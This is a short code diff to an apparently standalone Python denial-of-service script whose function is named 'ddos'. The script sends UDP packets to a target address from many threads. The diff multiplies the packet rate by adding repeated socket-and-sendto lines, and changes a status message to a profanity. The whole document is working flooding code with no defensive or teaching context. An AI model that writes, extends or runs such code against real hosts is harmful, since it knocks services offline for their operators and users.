@@ -23,6 +23,17 @@ def ddos(i):
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
         print("Packet Sent")
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
+        print("Packet fuck")
 for i in range(int(thread_count)):
     try:
         _thread.start_new_thread(ddos, ("Thread-" + str(i),))
